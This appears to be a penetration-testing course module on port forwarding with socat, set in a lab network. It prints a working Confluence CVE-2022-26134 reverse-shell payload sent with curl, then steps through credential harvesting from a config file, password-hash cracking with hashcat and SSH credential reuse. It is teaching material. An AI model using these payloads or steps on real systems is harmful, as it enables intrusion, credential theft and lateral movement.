To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
